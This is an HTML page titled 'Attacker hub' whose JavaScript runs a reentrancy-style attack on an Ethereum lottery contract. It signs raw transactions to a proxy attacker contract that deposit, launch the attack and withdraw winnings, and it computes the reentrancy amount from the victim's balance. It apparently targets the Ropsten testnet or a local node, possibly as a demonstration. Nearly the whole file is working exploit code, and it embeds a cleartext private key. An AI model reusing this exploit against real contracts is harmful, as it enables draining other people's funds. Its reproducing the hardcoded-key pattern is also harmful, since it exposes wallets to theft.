<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Attacker hub</title>
    <script type="text/javascript" src="lib/ethereumjs-tx-1.3.3.min.js"></script>
    <script>
    var account = "0x375ec30b5db55c2e2696a72e2380d034db5a26bb";
    //Private key in clear text: Don't try this at home :)
    var privateKey = "35c003e2b992b8b57f1979d44efe7159fca4ba6555cd4943633be709a4ae0f2d";

    var debug;
    var attackerAddress;
    var amountAttack;
    var victimContractAddress = "0x69505b87e9d26486b37dd59b5a2822bd04648bf5";
    var victimContractAbi = '[{"anonymous":false,"inputs":[{"indexed":false,"name":"winner","type":"address"}],"name":"LogUserLooser","type":"event"},{"constant":false,"inputs":[{"name":"char","type":"bytes1"}],"name":"bet","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"name":"winner","type":"address"},{"indexed":false,"name":"jackpot","type":"uint256"}],"name":"LogUserWinner","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"sender","type":"address"},{"indexed":false,"name":"amount","type":"uint256"},{"indexed":false,"name":"jackpot","type":"uint256"}],"name":"LogUserPlayed","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"recipient","type":"address"},{"indexed":false,"name":"amount","type":"uint256"},{"indexed":false,"name":"jackpot","type":"uint256"}],"name":"LogUserRefunded","type":"event"},{"constant":false,"inputs":[],"name":"refund","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"constant":true,"inputs":[],"name":"contractBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"u","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"upper","type":"uint256"}],"name":"random","outputs":[{"name":"randomNumber","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"userBets","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]';
    var VictimContract;
    var victimContractInstance;

    var ProxyContractAddress = "0x737ae5d00b0358bd6b20a6b5f3343cda118b76f9";
    var ProxyContractAbi = '[{"constant":false,"inputs":[{"name":"_vulnerable_contract","type":"address"}],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"get_money","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"launch_attack","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"win","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"constant":true,"inputs":[],"name":"attackModeIsOn","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"vulnerable_contract","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"}]';
    var ProxyContract;
    var ProxyContractInstance;



    if (checkAttackCondition()) {
        victimContract = web3.eth.contract(JSON.parse(victimContractAbi));
        victimContractInstance = victimContract.at(victimContractAddress);

        ProxyContract = web3.eth.contract(JSON.parse(ProxyContractAbi));
        ProxyContractInstance = ProxyContract.at(ProxyContractAddress);
    }

    window.addEventListener('load', function() {

        // Checking if Web3 has been injected by the browser (Mist/MetaMask)
        if (typeof web3 !== 'undefined') {

            // Use the browser's ethereum provider
            var provider = web3.currentProvider

        } else {
            console.log('No web3? You should consider trying MetaMask!')
        }

    })
    

    //check the victim and attacker contract parameter
    function checkAttackCondition() {
        var ret = true;
        if (!web3.isAddress(victimContractAddress)) {
            console.log("victim address is missing (use setVictimAddress())");
            ret = false;
        }
        if (!web3.isAddress(ProxyContractAddress)) {
            console.log("Proxy Contract Address address is missing (use setProxyContract())");
            ret = false;
        }
        if (victimContractAbi == "") {
            console.log("victim abi is missing (use setvictimContractAbi())");
            ret = false;
        }
        if (ProxyContractAbi == "") {
            console.log("Proxy Contract Address ABI is missing (use setProxyContractAbi())");
            ret = false;
        }

        return ret;
    }


    function balances() {
        var attackerBalance;
        var contractBalance;

        // amountAttack = web3.toWei(amountAttack, 'ether');
        victimContractInstance.getBalance(ProxyContractAddress, function(error, result) {
            attackerBalance = result.toNumber();
            web3.eth.getBalance(victimContractAddress, function(error, result) {
                contractBalance = result.toNumber();
                amountAttack = Math.floor(((contractBalance) / 2));
                web3.eth.getBalance(ProxyContractAddress, function(error, result) {
                     attackersContractBalance = result.toNumber();
                    console.log("Target contract balance:" + web3.fromWei(contractBalance, 'ether') + ", Attacker's lottery balance:" + web3.fromWei(attackerBalance, 'ether')+ ", Reentrancy ammount:" + web3.fromWei(amountAttack, 'ether') + ", Attacker's contract balance: "+ web3.fromWei(attackersContractBalance, 'ether'));
                    if (contractBalance >= amountAttack * 2) {
                        console.log("The amount of the attacker's transaction should be " + web3.fromWei(amountAttack, 'ether'));

                    } else {
                        console.log("Something is bugged here...");
                    }
                });
            });
        });



    }

    function deposit(amountEth) {
        ///
        if (!isNaN(amountEth)) {

           // var web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io/i3RVw2qkKtl0fLuVGPgV"));
           var web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8545"));
            /////deposit
            web3.eth.getTransactionCount(account, function(err, nonce) {
                var data = web3.eth.contract(JSON.parse(ProxyContractAbi)).at(ProxyContractAddress).deposit.getData(victimContractAddress);

                var tx = new ethereumjs.Tx({
                    nonce: nonce,
                    gasPrice: web3.toHex(web3.toWei('10', 'gwei')),
                    gasLimit: 100000,
                    to: ProxyContractAddress,
                    value: web3.toHex(web3.toWei(amountEth, 'ether')),
                    data: data,
                });
                tx.sign(ethereumjs.Buffer.Buffer.from(privateKey, 'hex'));

                var raw = '0x' + tx.serialize().toString('hex');
                // console.log(raw);
                web3.eth.sendRawTransaction(raw, function(err, transactionHash) {
                    console.log(err);
                    console.log("https://ropsten.etherscan.io/tx/" + transactionHash);

                });
            });
        } else {
            console.log("Missing the amount of the transaction");
        }
    }

    function launch_attack() {
        ///////////Withdraw////////////:
        web3.eth.getTransactionCount(account, function(err, nonce) {
            var data = web3.eth.contract(JSON.parse(ProxyContractAbi)).at(ProxyContractAddress).launch_attack.getData();

            var tx = new ethereumjs.Tx({
                nonce: nonce,
                gasPrice: web3.toHex(web3.toWei('10', 'gwei')),
                gasLimit: 100000,
                to: ProxyContractAddress,
                value: 0,
                data: data,
            });
            tx.sign(ethereumjs.Buffer.Buffer.from(privateKey, 'hex'));

            var raw = '0x' + tx.serialize().toString('hex');
            // console.log(raw);
            web3.eth.sendRawTransaction(raw, function(err, transactionHash) {
                console.log(err);
                console.log("https://ropsten.etherscan.io/tx/" + transactionHash);
            });
        });
        ///////////////Withdraw////////////////
    }

    function win() {
        ///////////Withdraw////////////:
        web3.eth.getTransactionCount(account, function(err, nonce) {
            var data = web3.eth.contract(JSON.parse(ProxyContractAbi)).at(ProxyContractAddress).win.getData();

            var tx = new ethereumjs.Tx({
                nonce: nonce,
                gasPrice: web3.toHex(web3.toWei('10', 'gwei')),
                gasLimit: 100000,
                to: ProxyContractAddress,
                value: 0,
                data: data,
            });
            tx.sign(ethereumjs.Buffer.Buffer.from(privateKey, 'hex'));

            var raw = '0x' + tx.serialize().toString('hex');
            // console.log(raw);
            web3.eth.sendRawTransaction(raw, function(err, transactionHash) {
                console.log(err);
                console.log("https://ropsten.etherscan.io/tx/" + transactionHash);
            });
        });
        ///////////////Withdraw////////////////
    }




    </script>
    <style type="text/css">
      body {
              margin:0;
              padding:0;
              background: url("insertCoin.png") no-repeat top fixed; 
              -webkit-background-size: cover; /* pour anciens Chrome et Safari */
              background-size: 100%; /* version standardisée */
              background-color: black;
          }

    </style>
</head>

<body >
</body>

</html>